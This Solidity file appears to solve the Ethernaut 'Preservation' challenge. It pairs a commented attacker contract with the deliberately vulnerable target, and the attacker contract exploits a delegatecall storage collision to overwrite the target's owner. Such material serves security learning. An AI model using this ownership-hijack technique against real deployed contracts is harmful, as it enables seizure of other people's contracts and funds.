// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version


import '../contracts/Preservation.sol';


contract HackPreservation {
    // Complete with the instance's address
    Preservation public originalContract = Preservation(0x65Ad08Dd5A6bEF8BB094aDAe5DbBDa91D9785b6F);
    // You're going to fill the second slot with random data
    address notUsed2 = address(this);
    // The third one it's going to be your address, so you can override the owner variable
    uint toOverride;

    function hack() public {
        // You're gonna set the first library to be this contract
        originalContract.setFirstTime(uint256(uint160(address(this))));
        // Then, you're gonna call the function setTime throw the Preservation contract
        originalContract.setFirstTime(uint256(uint160(tx.origin)));
    }

    function setTime(uint _time) public {
        // This way you're overriding the owner slot with your address
        toOverride = _time;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}